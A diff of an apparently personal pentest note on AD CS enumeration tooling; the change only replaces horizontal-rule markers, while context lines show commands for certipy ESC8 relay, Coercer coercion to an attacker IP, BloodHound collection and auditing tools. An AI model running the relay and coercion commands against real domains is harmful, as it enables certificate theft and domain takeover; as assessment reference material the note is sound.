@@ -18,7 +18,7 @@ linked:
 ---
 # AD - ADCS Enumeration - Tooling
 
-***
+---
 
 ## certipy (Linux)
 
@@ -36,7 +36,7 @@ linked:
 | `certipy relay -target http://<CA>/certsrv/certfnsh.asp -ca <CA> -template DomainController` | ESC8 built-in relay | All-in-one. |
 ^ad-adcstool-certipy
 
-___
+---
 
 ## PSPKIAudit (Windows)
 
@@ -56,7 +56,7 @@ Import-Module .\PSPKIAudit\PSPKIAudit.psd1
 Invoke-PKIAudit | Format-Table
 ```
 
-___
+---
 
 ## RSAT / Native Windows
 
@@ -70,7 +70,7 @@ ___
 | `Get-CertificateTemplate` (PSPKI) | Templates | Standard. |
 ^ad-adcstool-native
 
-___
+---
 
 ## BloodHound ADCS
 
@@ -91,7 +91,7 @@ ___
 bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
 ```
 
-___
+---
 
 ## ldapsearch / Linux LDAP
 
@@ -102,7 +102,7 @@ ___
 | `ldapsearch ... -b "CN=NTAuthCertificates,..." -s base "(objectClass=*)" cACertificate` | NTAuth raw | Linux. |
 ^ad-adcstool-ldapsearch
 
-___
+---
 
 ## ADRecon / Bulk Reports
 
@@ -120,7 +120,7 @@ Invoke-Locksmith -Mode 1
 # Output: ADCS misconfigs + remediation suggestions
 ```
 
-___
+---
 
 ## NTLM Relay Tools (ESC8)
 
@@ -133,7 +133,7 @@ ___
 | `Coercer.py coerce -t <victim> -l <attacker-IP> -u u -p pass -d corp.local` | Multi-method | Comprehensive. |
 ^ad-adcstool-relay
 
-___
+---
 
 ## Recursos
 
@@ -150,4 +150,4 @@ ___
 | Akamai ESC13/ESC14 research | `https://www.akamai.com/blog/security-research/active-directory-certificate-services-esc13` |
 ^ad-adcstool-resources
 
-***
+---
